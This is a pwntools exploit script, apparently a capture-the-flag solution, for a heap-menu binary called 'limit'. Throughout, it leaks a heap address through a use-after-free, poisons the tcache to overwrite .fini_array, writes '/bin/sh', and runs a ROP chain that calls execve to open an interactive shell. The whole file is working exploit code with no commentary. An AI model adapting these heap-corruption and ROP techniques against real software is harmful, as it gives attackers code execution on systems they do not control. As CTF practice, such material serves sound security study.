from pwn import *
context.log_level='debug'
context.terminal=['tmux','sp','-h']

#p=process('./limit',env={'LD_PRELOAD':'./libc-2.27.so'})
p = process("./limit")

def add(id,size):
    p.sendlineafter("choice: ",str(1))
    p.sendlineafter("Index: ",str(id))
    p.sendlineafter("Size: ",str(size))
def edit(id,content):
    p.sendlineafter("choice: ",str(2))
    p.sendlineafter("Index: ",str(id))
    p.sendafter("Content: ",content)
def show(id):
    p.sendlineafter("choice: ",str(3))
    p.sendlineafter("Index: ",str(id))
def delete(id):
    p.sendlineafter("choice: ",str(4))
    p.sendlineafter("Index: ",str(id))

free_hook = 0x6D7D58
_fini_array = [0x6d2150,0x6d2158]
__libc_csu_fini = 0x401E10

pop_rax_ret = 0x00000000004005cf
pop_rdi_ret = 0x00000000004007d6
pop_rsi_ret = 0x0000000000410763
pop_rdx_ret = 0x0000000000449605
syscall = 0x00000000004016fc
leave_ret = 0x000000000047e6e2
ret = 0x00000000004001c2

# leak heap address
add(0,0x1ff)
delete(0)
edit(0,'a'*7+'\n')
show(0)
p.recvuntil('a'*7+'\n')
heap_addr = u64(p.recv(3).ljust(8,'\x00'))#tcache struch
log.info("heap_addr:"+hex(heap_addr))
binsh_addr = heap_addr-(0x6da1d0-0x6dac90)
log.info("binsh_addr:"+hex(binsh_addr))

# hijack 
edit(0,p64(0x6D83C0)+'\n')
add(1,0x1ff)
add(2,0x1ff)
edit(2,p64(0x1ff)*4+p64(binsh_addr)+p64(0x6D83C0)+p64(_fini_array[0])+'\n')


edit(0,"/bin/sh\x00"+'\n')# write /bin/sh

payload = p64(leave_ret)# fini_array[0]
payload += p64(ret)# fini_array[1]
payload += p64(pop_rax_ret)
payload += p64(0x3b)
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(pop_rdx_ret)
payload += p64(0)
payload += p64(syscall)

edit(2,payload+'\n')

# gdb.attach(p,"b *0x401E38")
# raw_input()

p.sendlineafter("choice: ",str(5))

p.interactive()